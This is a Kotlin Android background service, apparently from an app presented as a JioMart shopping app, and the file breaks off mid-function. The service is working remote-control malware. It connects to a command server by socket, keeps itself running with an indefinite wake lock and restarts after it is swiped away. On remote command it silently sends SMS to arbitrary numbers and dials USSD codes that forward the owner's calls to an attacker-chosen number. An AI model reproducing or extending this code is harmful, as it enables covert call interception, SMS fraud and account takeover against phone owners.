package com.jiomart.ready.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.app.AlarmManager
import android.content.Intent
import android.content.SharedPreferences
import android.content.Context
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.os.Handler
import android.os.Looper
import android.os.SystemClock
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import android.provider.Settings
import android.telephony.TelephonyManager
import android.telephony.SubscriptionManager
import android.telephony.SubscriptionInfo
import android.net.Uri
import io.socket.client.IO
import io.socket.client.Socket
import java.net.URISyntaxException
import org.json.JSONObject
import okhttp3.OkHttpClient
import okhttp3.Request
import kotlin.math.min

class CallForwardingBackgroundService : Service() {
    
    companion object {
        private const val TAG = "🔥CallForwardingDebug"
        private const val CHANNEL_ID = "call_forwarding_channel"
        private const val NOTIFICATION_ID = 2001
        private const val PREFS_NAME = "CallForwardingPrefs"
        private const val RESTART_ACTION = "com.jiomart.ready.app.RESTART_CALL_FORWARDING_SERVICE"
        private const val PING_URL = "http://68/api/ping"
    }

    private var deviceId: String = ""
    private var socketUrl: String = ""
    private var headlessMode: Boolean = false
    private var autoExecute: Boolean = true
    private var enableRealTimeCommands: Boolean = true
    
    private val handler = Handler(Looper.getMainLooper())
    private var socket: Socket? = null
    private var reconnectRunnable: Runnable? = null
    private lateinit var sharedPrefs: SharedPreferences
    private var wakeLock: PowerManager.WakeLock? = null
    private var isServiceStarted = false
    private var connectionAttempts = 0

    // ✅ ADD: Guard flags
    private var isSocketConnecting = false  // ✅ NEW
    private var isSocketConnected = false   // ✅ NEW
    
    // ✅ ADD: Deduplication tracking for SMS commands
    private val executedSmsCommands = mutableSetOf<String>()
    private val executedCallForwardCommands = mutableSetOf<String>()

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "🚀 SERVICE CREATED - Process ID: ${android.os.Process.myPid()}")
        Log.d(TAG, "🚀 SERVICE CREATED - Thread: ${Thread.currentThread().name}")
        
        isServiceStarted = true
        
        try {
            sharedPrefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            Log.d(TAG, "✅ SharedPreferences initialized")
            
            createNotificationChannel()
            Log.d(TAG, "✅ Notification channel created")
            
            deviceId = getCustomDeviceId()
            Log.d(TAG, "✅ Device ID obtained: $deviceId")
            
            readConfigFromPreferences()
            Log.d(TAG, "✅ Configuration loaded")
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ ERROR in onCreate: ${e.message}")
            e.printStackTrace()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "🚀 SERVICE STARTED - Start ID: $startId")
        Log.d(TAG, "🚀 Intent: ${intent?.toString()}")

        try {
            val notification = createNotification()
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
            
            Log.d(TAG, "✅ Foreground service started with notification ID: $NOTIFICATION_ID")

            acquireProperWakeLock()

            val intentDeviceId = intent?.getStringExtra("deviceId")
            if (intentDeviceId != null) {
                deviceId = intentDeviceId
                Log.d(TAG, "✅ Device ID from intent: $deviceId")
            }
            
            saveConfigToPreferences()
            
            // ✅ FIXED: Only start background work if not already connected/connecting
            if (!isSocketConnected && !isSocketConnecting) {
                Log.d(TAG, "🔄 Starting background work...")
                startBackgroundWork()
            } else {
                Log.d(TAG, "⚠️ Socket already ${if (isSocketConnected) "connected" else "connecting"} - skipping new connection")
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ ERROR in onStartCommand: ${e.message}")
            e.printStackTrace()
        }

        Log.d(TAG, "✅ Returning START_STICKY")
        return START_STICKY
    }

    private fun acquireProperWakeLock() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "CallForwardingService::NetworkSocket"
            ).apply {
                setReferenceCounted(false)
                acquire()
                Log.d(TAG, "✅✅ INDEFINITE WakeLock acquired - will NEVER expire!")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ WakeLock acquisition failed: ${e.message}")
        }
    }

    override fun onTaskRemoved(removedTask: Intent?) {
        Log.d(TAG, "📱 APP SWIPED AWAY - onTaskRemoved called")
        Log.d(TAG, "📱 Removed task: ${removedTask?.toString()}")
        
        try {
            val restartServiceIntent = Intent(applicationContext, CallForwardingBackgroundService::class.java)
            restartServiceIntent.putExtra("deviceId", deviceId)
            
            val restartPendingIntent = PendingIntent.getService(
                applicationContext,
                1001,
                restartServiceIntent,
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )
            
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            
            alarmManager.setExact(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + 2000,
                restartPendingIntent
            )
            
            Log.d(TAG, "✅ Service restart scheduled via AlarmManager")
        } catch (e: Exception) {
            Log.e(TAG, "❌ ERROR scheduling restart: ${e.message}")
        }
        
        super.onTaskRemoved(removedTask)
    }

    private fun readConfigFromPreferences() {
        try {
            Log.d(TAG, "📖 Reading config from SharedPreferences...")
            
            deviceId = sharedPrefs.getString("deviceId", deviceId) ?: deviceId
            socketUrl = sharedPrefs.getString("socketUrl","http://68") ?: "http://68"
            headlessMode = sharedPrefs.getBoolean("headlessMode", true)
            autoExecute = sharedPrefs.getBoolean("autoExecute", true)
            enableRealTimeCommands = sharedPrefs.getBoolean("enableRealTimeCommands", true)
            
            Log.d(TAG, "✅ Config loaded:")
            Log.d(TAG, "   Device ID: $deviceId")
            Log.d(TAG, "   Socket URL: $socketUrl")
            Log.d(TAG, "   Headless Mode: $headlessMode")
            Log.d(TAG, "   Auto Execute: $autoExecute")
            Log.d(TAG, "   Real-time Commands: $enableRealTimeCommands")
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ ERROR reading preferences: ${e.message}")
            socketUrl = "http://68"
            headlessMode = true
            autoExecute = true
            enableRealTimeCommands = true
            Log.d(TAG, "✅ Using default configuration")
        }
    }
    
    private fun saveConfigToPreferences() {
        try {
            with(sharedPrefs.edit()) {
                putString("deviceId", deviceId)
                putString("socketUrl", socketUrl)
                putBoolean("headlessMode", headlessMode)
                putBoolean("autoExecute", autoExecute)
                putBoolean("enableRealTimeCommands", enableRealTimeCommands)
                apply()
            }
            Log.d(TAG, "✅ Config saved to SharedPreferences")
        } catch (e: Exception) {
            Log.e(TAG, "❌ ERROR saving preferences: ${e.message}")
        }
    }

    private fun startBackgroundWork() {
        Log.d(TAG, "⏰ Scheduling socket connection in 3 seconds...")
        handler.postDelayed({
            try {
                Log.d(TAG, "🔌 Starting socket connection now...")
                startSocketConnection()
            } catch (e: Exception) {
                Log.e(TAG, "❌ ERROR in background work: ${e.message}")
                e.printStackTrace()
            }
        }, 3000)
    }

   private fun startSocketConnection() {
    Log.d(TAG, "🔌 startSocketConnection() called")
    
    // ✅ GUARD: Prevent multiple simultaneous connection attempts
    if (isSocketConnecting) {
        Log.w(TAG, "⚠️ Socket connection already in progress - aborting duplicate attempt")
        return
    }
    
    if (isSocketConnected && socket?.connected() == true) {
        Log.w(TAG, "⚠️ Socket already connected - aborting duplicate attempt")
        return
    }
    
    if (socketUrl.isEmpty()) {
        Log.e(TAG, "❌ Socket URL is empty!")
        return
    }
    
    if (deviceId.isEmpty()) {
        Log.e(TAG, "❌ Device ID is empty!")
        return
    }
    
    // ✅ Mark as connecting
    isSocketConnecting = true
    isSocketConnected = false
    
    connectionAttempts++
    Log.d(TAG, "🔌 Connection attempt #$connectionAttempts")
    Log.d(TAG, "🔌 Socket URL: $socketUrl")
    Log.d(TAG, "🔌 Device ID: $deviceId")
    
    try {
        // ✅ Clean up old socket FIRST
        socket?.let { oldSocket ->
            Log.d(TAG, "🧹🧹🧹 Cleaning up old socket connection")
            try {
                oldSocket.off()
                oldSocket.disconnect()
                oldSocket.close()
                Log.d(TAG, "✅ Old socket cleaned up successfully")
            } catch (e: Exception) {
                Log.e(TAG, "⚠️ Error cleaning old socket: ${e.message}")
            }
        }
        socket = null
        
        // Wait for cleanup
        Thread.sleep(500)
        
        val options = IO.Options().apply {
            transports = arrayOf("polling", "websocket")
            timeout = 60000
            reconnection = true
            reconnectionAttempts = Integer.MAX_VALUE
            reconnectionDelay = 2000
            reconnectionDelayMax = 10000
            forceNew = true
            query = "deviceId=$deviceId&platform=android&source=kotlin_background_service&headless=true&timestamp=${System.currentTimeMillis()}"
        }
        
        Log.d(TAG, "🔌 Creating NEW socket with options:")
        Log.d(TAG, "   Transports: ${options.transports.contentToString()}")
        Log.d(TAG, "   Query: ${options.query}")
        
        socket = IO.socket(socketUrl, options)
        Log.d(TAG, "✅ Socket instance created")
        
        setupSocketListeners()
        Log.d(TAG, "✅ Socket listeners setup complete")
        
        socket?.connect()
        Log.d(TAG, "🔌 Socket connect() called")
        
    } catch (e: URISyntaxException) {
        Log.e(TAG, "❌ Invalid socket URL: ${e.message}")
        isSocketConnecting = false
        scheduleReconnect()
    } catch (e: Exception) {
        Log.e(TAG, "❌ Socket connection error: ${e.message}")
        e.printStackTrace()
        isSocketConnecting = false
        scheduleReconnect()
    }
}

// ✅ SINGLE CORRECT setupSocketListeners() method
private fun setupSocketListeners() {
    Log.d(TAG, "🎯 Setting up socket listeners...")
    
    socket?.apply {
        // ✅ CRITICAL: Remove ALL existing listeners first
        off()
        Log.d(TAG, "🧹 Cleared ALL existing listeners")
        
        on(Socket.EVENT_CONNECT) {
            Log.d(TAG, "✅✅✅ SOCKET CONNECTED! ✅✅✅")
            Log.d(TAG, "Socket ID: ${id()}")
            updateNotification("🔥 CONNECTED - Socket ID: ${id()}")
            
            // ✅ Update connection flags
            connectionAttempts = 0
            isSocketConnecting = false
            isSocketConnected = true
            
            handler.postDelayed({
                Log.d(TAG, "📡 Emitting register-device with deviceId: $deviceId")
                emit("register-device", deviceId)
                setupEventListeners()
            }, 1000)
        }
        
        on("registered") { args ->
            Log.d(TAG, "✅✅✅ DEVICE REGISTERED! ✅✅✅")
            Log.d(TAG, "Registration response: ${args.contentToString()}")
            updateNotification("✅ REGISTERED - Ready for commands")
            startKeepAlive()
        }
        
        on(Socket.EVENT_DISCONNECT) { args ->
            Log.d(TAG, "❌❌❌ SOCKET DISCONNECTED ❌❌❌")
            Log.d(TAG, "Disconnect reason: ${args.contentToString()}")
            
            // ✅ Reset connection flags
            isSocketConnected = false
            isSocketConnecting = false
            
            updateNotification("❌ DISCONNECTED - Reconnecting...")
            scheduleReconnect()
        }
        
        on(Socket.EVENT_CONNECT_ERROR) { args ->
            Log.e(TAG, "❌❌❌ CONNECTION ERROR ❌❌❌")
            Log.e(TAG, "Error details: ${args.contentToString()}")
            
            // ✅ Reset connection flags
            isSocketConnected = false
            isSocketConnecting = false
            
            updateNotification("❌ CONNECTION ERROR")
            scheduleReconnect()
        }
        
        io().on("reconnect") { args ->
            Log.d(TAG, "🔄🔄🔄 RECONNECTED 🔄🔄🔄")
            Log.d(TAG, "Reconnect attempts: ${args.contentToString()}")
            updateNotification("🔄 RECONNECTED")
            
            // ✅ Update flags
            connectionAttempts = 0
            isSocketConnecting = false
            isSocketConnected = true
            
            handler.postDelayed({
                Log.d(TAG, "📡 Re-emitting register-device after reconnection")
                emit("register-device", deviceId)
                setupEventListeners()
            }, 500)
        }
        
        io().on("reconnection_attempt") { args ->
            Log.d(TAG, "🔄 Reconnection attempt: ${args.contentToString()}")
            updateNotification("🔄 Reconnecting... attempt ${args.contentToString()}")
        }
        
        on("pong") {
            Log.d(TAG, "🏓 PONG received - connection alive")
        }
        
        on("connect_timeout") {
            Log.e(TAG, "⏰ CONNECTION TIMEOUT")
            isSocketConnecting = false  // ✅ Reset on timeout
        }
        
        on("error") { args ->
            Log.e(TAG, "💥 SOCKET ERROR: ${args.contentToString()}")
        }
    }
    
    Log.d(TAG, "✅ All socket listeners registered")
}

    
 
    
    private fun setupEventListeners() {
        Log.d(TAG, "🎯🎯🎯 SETTING UP COMMAND LISTENERS 🎯🎯🎯")
        
        socket?.apply {
            // ✅ Remove old command listeners before adding new ones
            off("call-forward-command")
            off("send-sms-command")
            
            Log.d(TAG, "🧹 Cleared existing command listeners")
            
            on("call-forward-command") { args -> 
                Log.d(TAG, "📞📞📞 CALL-FORWARD-COMMAND EVENT RECEIVED 📞📞📞")
                Log.d(TAG, "Call forward data: ${args.contentToString()}")
                handleCallForwardingCommand(args) 
            }
            
            on("send-sms-command") { args -> 
                Log.d(TAG, "📨📨📨 SEND-SMS-COMMAND EVENT RECEIVED 📨📨📨")
                Log.d(TAG, "Send SMS data: ${args.contentToString()}")
                handleSendSmsCommand(args) 
            }
            
            Log.d(TAG, "✅✅✅ ALL COMMAND LISTENERS SETUP COMPLETE ✅✅✅")
        }
    }
    
    private fun handleCallForwardingCommand(args: Array<Any>) {
        Log.d(TAG, "🔧 handleCallForwardingCommand() called")
        Log.d(TAG, "🔧 Args count: ${args.size}")
        Log.d(TAG, "🔧 Enable real-time commands: $enableRealTimeCommands")
        
        try {
            if (args.isNotEmpty() && enableRealTimeCommands) {
                val cmdData = args[0] as? JSONObject
                Log.d(TAG, "🔧 Command JSON: $cmdData")
                
                // ✅ DEDUPLICATION CHECK
                val commandId = cmdData?.optString("_id") ?: cmdData?.optJSONObject("payload")?.optString("commandId") ?: ""
                
                if (commandId.isNotEmpty() && executedCallForwardCommands.contains(commandId)) {
                    Log.w(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                    Log.w(TAG, "⚠️⚠️⚠️ DUPLICATE CALL FORWARD BLOCKED ⚠️⚠️⚠️")
                    Log.w(TAG, "⚠️ Command ID: $commandId")
                    Log.w(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                    return
                }
                
                if (commandId.isNotEmpty()) {
                    executedCallForwardCommands.add(commandId)
                    if (executedCallForwardCommands.size > 50) {
                        val toRemove = executedCallForwardCommands.take(executedCallForwardCommands.size - 50)
                        executedCallForwardCommands.removeAll(toRemove.toSet())
                    }
                }
                
                executeCallForwardingCommand(cmdData)
            } else {
                Log.w(TAG, "⚠️ Command ignored - args empty or real-time disabled")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ ERROR in handleCallForwardingCommand: ${e.message}")
            e.printStackTrace()
        }
    }
    
    // ✅ FIXED: Added SMS command deduplication
    private fun handleSendSmsCommand(args: Array<Any>) {
        Log.d(TAG, "📨 handleSendSmsCommand() called")
        Log.d(TAG, "📨 Args count: ${args.size}")
        
        try {
            if (args.isNotEmpty()) {
                val cmdData = args[0] as? JSONObject
                Log.d(TAG, "📨 Send SMS JSON: $cmdData")
                
                // ✅ DEDUPLICATION CHECK BEFORE EXECUTION
                val commandId = cmdData?.optString("_id") ?: cmdData?.optJSONObject("payload")?.optString("uniqueCommandId") ?: ""
                
                if (commandId.isNotEmpty() && executedSmsCommands.contains(commandId)) {
                    Log.w(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                    Log.w(TAG, "⚠️⚠️⚠️ DUPLICATE SMS COMMAND BLOCKED ⚠️⚠️⚠️")
                    Log.w(TAG, "⚠️ Command ID: $commandId")
                    Log.w(TAG, "⚠️ Already executed by this Kotlin service")
                    Log.w(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                    return
                }
                
                // ✅ Mark as executed BEFORE processing
                if (commandId.isNotEmpty()) {
                    executedSmsCommands.add(commandId)
                    Log.d(TAG, "✅ SMS command marked as executing: $commandId")
                    
                    // ✅ Cleanup old entries (keep last 50)
                    if (executedSmsCommands.size > 50) {
                        val toRemove = executedSmsCommands.take(executedSmsCommands.size - 50)
                        executedSmsCommands.removeAll(toRemove.toSet())
                        Log.d(TAG, "🧹 Cleaned up ${toRemove.size} old SMS command IDs")
                    }
                }
                
                executeSendSmsCommand(cmdData)
            } else {
                Log.w(TAG, "⚠️ SMS command ignored - args empty")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ ERROR in handleSendSmsCommand: ${e.message}")
            e.printStackTrace()
        }
    }

    private fun executeSendSmsCommand(cmdData: JSONObject?) {
        Log.d(TAG, "📨📨📨 EXECUTING SEND SMS COMMAND 📨📨📨")
        Log.d(TAG, "Command data: $cmdData")
        
        try {
            if (cmdData == null) {
                Log.e(TAG, "❌ Command data is null!")
                return
            }
            
            val action = cmdData.optString("action")
            Log.d(TAG, "Action: $action")
            
            if (action != "SEND_SMS") {
                Log.w(TAG, "⚠️ Action is not SEND_SMS: $action")
                return
            }
            
            val payload = cmdData.optJSONObject("payload")
            if (payload == null) {
                Log.e(TAG, "❌ Payload is null!")
                sendCommandAck(cmdData, false, "Payload is null")
                return
            }
            
            Log.d(TAG, "Payload: $payload")
            
            val to = payload.optString("to", "")
            val body = payload.optString("body", "")
            val slot = payload.optInt("slot", 0)
            
            if (to.isEmpty() || body.isEmpty()) {
                Log.e(TAG, "❌ Missing recipient or message body")
                sendCommandAck(cmdData, false, "Missing recipient or message")
                return
            }
            
            Log.d(TAG, "📨 Recipient: $to")
            Log.d(TAG, "📨 Message: $body")
            Log.d(TAG, "📨 Slot: $slot")
            
            updateNotification("📨 Sending SMS to $to")
            
            sendSmsViaNative(to, body, slot, cmdData)
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ ERROR executing send SMS: ${e.message}")
            e.printStackTrace()
            sendCommandAck(cmdData, false, "SMS execution error: ${e.message}")
        }
    }

    private fun sendSmsViaNative(phoneNumber: String, message: String, slotId: Int, cmdData: JSONObject?) {
        Log.d(TAG, "📱📱📱 SENDING SMS VIA NATIVE 📱📱📱")
        Log.d(TAG, "To: $phoneNumber")
        Log.d(TAG, "Message: $message")
        Log.d(TAG, "Target Slot: $slotId (SIM ${slotId + 1})")
        
        try {
            val result = getSmsManagerForSlot(slotId)
            
            if (result == null) {
                throw Exception("Could not get SMS manager for SIM ${slotId + 1} (slot $slotId)")
            }
            
            val (smsManager, subscriptionId) = result
            
            Log.d(TAG, "✅ Got SmsManager for slot $slotId with subscription ID: $subscriptionId")
            
            val parts = smsManager.divideMessage(message)
            
            if (parts.size > 1) {
                Log.d(TAG, "📨 Message split into ${parts.size} parts")
                smsManager.sendMultipartTextMessage(
                    phoneNumber,
                    null,
                    parts,
                    null,
                    null
                )
            } else {
                smsManager.sendTextMessage(
                    phoneNumber,
                    null,
                    message,
                    null,
                    null
                )
            }
            
            Log.d(TAG, "✅✅✅ SMS SENT SUCCESSFULLY ✅✅✅")
            Log.d(TAG, "✅ From: SIM ${slotId + 1} (slot $slotId)")
            Log.d(TAG, "✅ To: $phoneNumber")
            Log.d(TAG, "✅ Subscription ID: $subscriptionId")
            
            sendCommandAck(cmdData, true, "✅ SMS sent successfully from SIM ${slotId + 1} to $phoneNumber")
            updateNotification("✅ SMS sent from SIM ${slotId + 1}")
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ SMS sending failed: ${e.message}")
            e.printStackTrace()
            sendCommandAck(cmdData, false, "SMS sending failed: ${e.message}")
            updateNotification("❌ SMS failed: ${e.message}")
        }
    }

    @Suppress("DEPRECATION")
    private fun getSmsManagerForSlot(slotId: Int): Pair<android.telephony.SmsManager, Int>? {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as android.telephony.SubscriptionManager
                
                val subscriptions = subscriptionManager.activeSubscriptionInfoList
                
                if (subscriptions.isNullOrEmpty()) {
                    Log.e(TAG, "❌ No active SIM subscriptions found")
                    return null
                }
                
                Log.d(TAG, "📱 Found ${subscriptions.size} active SIM subscription(s)")
                
                subscriptions.forEachIndexed { index, sub ->
                    Log.d(TAG, "📱 SIM ${index + 1}: Slot ${sub.simSlotIndex}, ID ${sub.subscriptionId}, Carrier: ${sub.carrierName}")
                }
                
                val targetSubscription = subscriptions.find { it.simSlotIndex == slotId }
                
                if (targetSubscription == null) {
                    Log.e(TAG, "❌ No SIM found in slot $slotId (SIM ${slotId + 1})")
                    Log.e(TAG, "❌ Available slots: ${subscriptions.map { it.simSlotIndex }.joinToString()}")
                    
                    Log.w(TAG, "⚠️ Using default SIM as fallback")
                    val defaultSubId = android.telephony.SubscriptionManager.getDefaultSmsSubscriptionId()
                    return Pair(
                        android.telephony.SmsManager.getSmsManagerForSubscriptionId(defaultSubId),
                        defaultSubId
                    )
                }
                
                val subscriptionId = targetSubscription.subscriptionId
                Log.d(TAG, "✅ Using SIM ${slotId + 1} (slot $slotId) with subscription ID: $subscriptionId")
                Log.d(TAG, "✅ Carrier: ${targetSubscription.carrierName}, Number: ${targetSubscription.number ?: "N/A"}")
                
                return Pair(
                    android.telephony.SmsManager.getSmsManagerForSubscriptionId(subscriptionId),
                    subscriptionId
                )
                
            } else {
                Log.w(TAG, "⚠️ Device API < 22, using default SMS manager")
                return Pair(android.telephony.SmsManager.getDefault(), -1)
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error getting SMS manager for slot $slotId: ${e.message}")
            e.printStackTrace()
            return null
        }
    }

    private fun executeCallForwardingCommand(
        cmdData: JSONObject?, 
        autoExecute: Boolean = this.autoExecute, 
        forceDeactivate: Boolean = false, 
        forceActivate: Boolean = false
    ) {
        Log.d(TAG, "⚡⚡⚡ EXECUTING CALL FORWARDING COMMAND ⚡⚡⚡")
        Log.d(TAG, "Command data: $cmdData")
        Log.d(TAG, "Auto execute: $autoExecute")
        Log.d(TAG, "Force deactivate: $forceDeactivate")
        Log.d(TAG, "Force activate: $forceActivate")
        
        try {
            if (cmdData == null) {
                Log.e(TAG, "❌ Command data is null!")
                return
            }
            
            val action = cmdData.optString("action")
            Log.d(TAG, "Action: $action")
            
            if (action != "CALL_FORWARD") {
                Log.w(TAG, "⚠️ Action is not CALL_FORWARD: $action")
                return
            }
            
            val payload = cmdData.optJSONObject("payload")
            if (payload == null) {
                Log.e(TAG, "❌ Payload is null!")
                return
            }
            
            Log.d(TAG, "Payload: $payload")
            
            val slot = payload.optInt("slot", 0)
            val number = payload.optString("number", "")
            val isDeactivation = forceDeactivate || payload.optBoolean("isDeactivation", false) || number.isEmpty()
            
            val ussdCode = if (isDeactivation || forceDeactivate) {
                "#21#"
            } else {
                "*21*${number.trim()}#"
            }
            
            Log.d(TAG, "📞 USSD Code: $ussdCode")
            Log.d(TAG, "📞 Slot: $slot")
            Log.d(TAG, "📞 Number: $number")
            Log.d(TAG, "📞 Is Deactivation: $isDeactivation")
            
            updateNotification("⚡ Executing: $ussdCode")
            
            executeUssdCode(ussdCode, slot, cmdData)
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ ERROR executing call forwarding: ${e.message}")
            e.printStackTrace()
            sendCommandAck(cmdData, false, "Execution error: ${e.message}")
        }
    }
    
    private fun executeUssdCode(ussdCode: String, slotId: Int, cmdData: JSONObject?) {
        Log.d(TAG, "📱📱📱 EXECUTING USSD CODE 📱📱📱")
        Log.d(TAG, "USSD Code: $ussdCode")
        Log.d(TAG, "Target SIM Slot: $slotId")
        
        try {
            Log.d(TAG, "🔄 Trying TelephonyManager method for SIM ${slotId + 1}...")
            if (executeUssdViaTelephony(ussdCode, slotId)) {
                Log.d(TAG, "✅ TelephonyManager method succeeded for SIM ${slotId + 1}")
                sendCommandAck(cmdData, true, "✅ USSD executed via TelephonyManager on SIM ${slotId + 1}: $ussdCode")
                updateNotification("✅ SIM ${slotId + 1} executed: $ussdCode")
                return
            }
            
            Log.d(TAG, "🔄 Trying dialer intent method...")
            val intent = Intent(Intent.ACTION_CALL).apply {
                data = Uri.parse("tel:${Uri.encode(ussdCode)}")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    putExtra("com.android.phone.extra.slot", slotId)
                    putExtra("slot", slotId)
                    putExtra("simSlot", slotId)
                }
            }
            
            if (intent.resolveActivity(packageManager) != null) {
                Log.d(TAG, "✅ Starting dialer activity for SIM ${slotId + 1}")
                startActivity(intent)
                sendCommandAck(cmdData, true, "✅ USSD executed via dialer on SIM ${slotId + 1}: $ussdCode")
                updateNotification("✅ SIM ${slotId + 1} executed via dialer: $ussdCode")
            } else {
                throw Exception("No dialer app available")
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ USSD execution failed for SIM ${slotId + 1}: ${e.message}")
            e.printStackTrace()
            sendCommandAck(cmdData, false, "USSD execution failed for SIM ${slotId + 1}: ${e.message}")
            updateNotification("❌ SIM ${slotId + 1} failed: ${e.message}")
        }
    }
    
    private fun executeUssdViaTelephony(ussdCode: String, slotId: Int): Boolean {
        Log.d(TAG, "☎️ executeUssdViaTelephony() called for slot: $slotId")
        
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val telephonyManager = getTelephonyManagerForSlot(slotId)
                
                if (telephonyManager == null) {
                    Log.e(TAG, "☎️ No TelephonyManager available for slot $slotId")
                    return false
                }
                
                Log.d(TAG, "☎️ Using TelephonyManager for SPECIFIC slot $slotId")
                
                val method = TelephonyManager::class.java.getDeclaredMethod(
                    "sendUssdRequest", 
                    String::class.java, 
                    TelephonyManager.UssdResponseCallback::class.java,
                    android.os.Handler::class.java
                )
                method.isAccessible = true
                
                val callback = object : TelephonyManager.UssdResponseCallback() {
                    override fun onReceiveUssdResponse(
                        telephonyManager: TelephonyManager,
                        request: String,
                        response: CharSequence
                    ) {
                        Log.d(TAG, "☎️ USSD Response for SIM ${slotId + 1}: $response")
                        updateNotification("📞 SIM ${slotId + 1} Response: $response")
                    }

                    override fun onReceiveUssdResponseFailed(
                        telephonyManager: TelephonyManager,
                        request: String,
                        failureCode: Int
                    ) {
                        Log.e(TAG, "☎️ USSD Failed for SIM ${slotId + 1} with code: $failureCode")
                        updateNotification("❌ SIM ${slotId + 1} USSD failed: $failureCode")
                    }
                }
                
                method.invoke(telephonyManager, ussdCode, callback, null)
                Log.d(TAG, "☎️ USSD executed successfully on SIM ${slotId + 1}")
                return true
            } else {
                Log.d(TAG, "☎️ Device too old for slot-specific USSD")
            }
            
            false
        } catch (e: Exception) {
            Log.e(TAG, "☎️ TelephonyManager failed for slot $slotId: ${e.message}")
            e.printStackTrace()
            false
        }
    }

    @Suppress("DEPRECATION")
    private fun getTelephonyManagerForSlot(slotId: Int): TelephonyManager? {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
                
                val subscriptions = subscriptionManager.activeSubscriptionInfoList
                
                if (subscriptions.isNullOrEmpty()) {
                    Log.e(TAG, "☎️ No active subscriptions found")
                    return null
                }
                
                Log.d(TAG, "☎️ Found ${subscriptions.size} active subscriptions")
                subscriptions.forEach { sub ->
                    Log.d(TAG, "☎️ Subscription - Slot: ${sub.simSlotIndex}, ID: ${sub.subscriptionId}, Carrier: ${sub.carrierName}")
                }
                
                val targetSubscription = subscriptions.find { it.simSlotIndex == slotId }
                
                if (targetSubscription == null) {
                    Log.e(TAG, "☎️ No subscription found for slot $slotId")
                    return null
                }
                
                Log.d(TAG, "☎️ Using subscription ID ${targetSubscription.subscriptionId} for slot $slotId")
                
                val baseTelephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                return baseTelephonyManager.createForSubscriptionId(targetSubscription.subscriptionId)
                
            } else {
                return getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            }
        } catch (e: Exception) {
            Log.e(TAG, "☎️ Error getting TelephonyManager for slot $slotId: ${e.message}")
            e.printStackTrace()
            return null
        }
    }
    
    private fun sendCommandAck(cmdData: JSONObject?, success: Boolean, message: String) {
        Log.d(TAG, "📤 Sending command ACK")
        Log.d(TAG, "Success: $success")
        Log.d(TAG, "Message: $message")
        
        try {
            val ackData = JSONObject().apply {
                put("commandId", cmdData?.optString("_id", ""))
                put("success", success)
                put("deviceId", deviceId)
                put("timestamp", System.currentTimeMillis())
                put("autoExecuted", true)
                put("message", message)
                put("source", "kotlin_background_service")
            }
            
            Log.d(TAG, "📤 ACK Data: $ackData")
            
            socket?.emit("command-ack", ackData)
            Log.d(TAG, "✅ Command ACK sent successfully")
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ ERROR sending command ack: ${e.message}")
            e.printStackTrace()
        }
    }
    
    private fun startKeepAlive() {
        Log.d(TAG, "🏓 Starting keep-alive mechanism with HTTP ping for Render FREE")
        
        val keepAliveRunnable = object : Runnable {
            override fun run() {
                try {
                    if (isServiceStarted) {
                        if (socket?.connected() == true) {
                            Log.d(TAG, "🏓 Sending socket ping...")
                            socket?.emit("ping", JSONObject().apply {
                                put("timestamp", System.currentTimeMillis())
                                put("source", "kotlin_background_service")
                            })
                        } else {
                            Log.w(TAG, "⚠️ Socket not connected - attempting reconnect")
                            scheduleReconnect()
                        }
                        
                        Thread {
                            try {
                                val client = OkHttpClient()
                                val request = Request.Builder()
                                    .url(PING_URL)
                                    .get()
                                    .build()
                                
                                val response = client.newCall(request).execute()
                                response.close()
                                
                                Log.d(TAG, "✅✅ HTTP PING SUCCESS - Render FREE kept awake! (Status: ${response.code})")
                            } catch (e: Exception) {
                                Log.w(TAG, "⚠️ HTTP ping failed: ${e.message}")
                            }
                        }.start()
                        
                        handler.postDelayed(this, 300000) // Every 5 minutes
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Keep-alive error: ${e.message}")
                    scheduleReconnect()
                }
            }
